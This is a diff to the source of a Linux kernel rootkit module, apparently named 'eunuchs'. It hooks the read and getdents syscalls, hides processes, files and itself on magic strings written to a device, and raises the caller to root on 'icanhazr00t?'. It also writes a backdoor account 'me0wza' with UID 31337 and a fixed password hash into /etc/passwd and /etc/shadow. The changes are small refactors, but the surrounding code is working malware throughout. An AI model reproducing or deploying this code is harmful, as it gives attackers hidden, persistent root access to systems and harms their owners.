@@ -83,8 +83,8 @@ static unsigned long *sct = 0xc167b180;
  *  user -> me0wza
  *  pass -> w0wza
  **/
-#define EUNUCHS_PASSWD_MOD "\nme0wza:x:31337:31337::/:/bin/sh\n"
-#define EUNUCHS_SHADOW_MOD "\nme0wza:$6$ndHcTwCTVHYKicfm$rucI7fX275L7zHK/wQ.olS8tt3xFvhFCut0SdVAQn2Rt9kHTi4K8ftjvImMM.9w2CKW6HgDw/lzzdoh0Vt4d10:18227:0:99999:7:::\n"
+#define EUNUCHS_PASSWD_MOD "me0wza:x:31337:31337::/:/bin/sh\n"
+#define EUNUCHS_SHADOW_MOD "me0wza:$6$ndHcTwCTVHYKicfm$rucI7fX275L7zHK/wQ.olS8tt3xFvhFCut0SdVAQn2Rt9kHTi4K8ftjvImMM.9w2CKW6HgDw/lzzdoh0Vt4d10:18227:0:99999:7:::\n"
 
 #include <linux/init.h>
 #include <linux/module.h>
@@ -194,45 +194,45 @@ static ssize_t eunuchs_char_write(struct file *f, const char __user *buf, size_t
 
     debug("write() got [%s] [%d bytes]\n", a, len);
 
-    if(strncmp(a, "kthxbye", 7) == 0)
+    if(!strncmp(a, "kthxbye", 7))
     {
         eunuchs_hide_lkm();
     }
-    else if(strncmp(a, "lemmesee", 8) == 0)
+    else if(!strncmp(a, "lemmesee", 8))
     {
         eunuchs_show_lkm();
     }
-    else if(strncmp(a, "ohaiplzhideproc ", 16) == 0)
+    else if(!strncmp(a, "ohaiplzhideproc ", 16))
     {
         char *p = a + 16;
         debug("hiding pid %s\n", p);
         hide_proc_by_pid(p);
     }
-    else if(strncmp(a, "ohaiplzshowproc ", 15) == 0)
+    else if(!strncmp(a, "ohaiplzshowproc ", 15))
     {
         char *p = a + 16;
         debug("showing pid %s\n", p);
         show_proc_by_pid(p);
     }
-    else if(strncmp(a, "ohaiplzhidefile ", 15) == 0)
+    else if(!strncmp(a, "ohaiplzhidefile ", 15))
     {
         char *p = a + 16;
         debug("want to hide file\n");
         hide_file_by_ext(p);
     }
-    else if(strncmp(a, "ohaiplzshowfile ", 15) == 0)
+    else if(!strncmp(a, "ohaiplzshowfile ", 15))
     {
         char *p = a + 16;
         debug("want to show file\n");
         show_file_by_ext(p);
     }
-    else if(strncmp(a, "icanhazr00t?", 12) == 0)
+    else if(!strncmp(a, "icanhazr00t?", 12))
     {
         debug("want to elevate creds\n");
         eunuchs_elevate_creds();
     }
 #ifdef DEBUG
-    else if(strncmp(a, "ohaiplzshowallhiding", 20) == 0)
+    else if(!strncmp(a, "ohaiplzshowallhiding", 20))
     {
         eunuchs_lists_show_all();
     }
@@ -523,6 +523,7 @@ static asmlinkage long eunuchs_read(int fd, char __user *buf, size_t count)
                 char *mark = strstr(new_buf, snicklefritz),
                      *end = mark + strlen(snicklefritz);
                 int remaining = strlen(end) + 1; // + 1 for null term
+                debug("moving with mark [%p] end [%p] remaining %d\n", mark, end, remaining);
                 memmove(mark, end, remaining);
                 res -= strlen(snicklefritz);
             }
@@ -603,7 +604,6 @@ static asmlinkage int eunuchs_getdents(unsigned int fd, struct linux_dirent __us
         kfree(new_fp);
 
     return res;
-    return orig_getdents(fd, fp, count);
 }
 
 /**
@@ -1097,10 +1097,6 @@ static int eunuchs_install_backdoor(void)
     {
         char *p = EUNUCHS_PASSWD_MOD;
 
-        /* do this to avoid inserting a blank line */
-        if(buf[size-1] == '\n')
-            p++;
-
         if(IS_ERR(res = vfs_write(f, p, strlen(p), &pos)))
         {
             debug("vfs_write failed on passwd\n");
@@ -1148,10 +1144,6 @@ static int eunuchs_install_backdoor(void)
     if(!strnstr(buf, EUNUCHS_SHADOW_MOD, size))
     {
         char *s = EUNUCHS_SHADOW_MOD;
-
-        /* again, to avoid inserting a blank line in the file */
-        if(buf[size-1] == '\n')
-            s++;
 
         if(IS_ERR(res = vfs_write(f, s, strlen(s), &pos)))
         {
